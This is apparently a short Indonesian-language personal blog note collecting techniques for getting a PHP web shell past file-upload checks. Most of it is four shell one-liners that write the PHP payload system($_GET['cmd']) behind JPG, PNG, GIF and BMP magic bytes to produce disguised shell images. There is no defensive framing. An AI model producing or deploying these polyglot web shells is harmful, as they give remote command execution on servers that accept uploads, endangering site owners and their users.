---
layout: post
title: "Note: Injecting RCE into Image"
date: 2022-12-09
---

Karena, saya rada kesusahan untuk mengumpulkan resource jika nanti googling-googling. Dan note yang saya pakai juga tidak lengkap referensinya, maka saya kumpulkan di sini. 

Jika ada malicious upload, maka yang seharusnya dilakukan adalah memanipulasi file extension atau memanipulasi isi dari file tersebut

## JPG
```shell
echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
```

## PNG
```shell
echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png
```

## GIF
```shell
echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif
```
## BMP
```shell
echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
```

## References
* https://twitter.com/0x0SojalSec/status/1599809897658724357
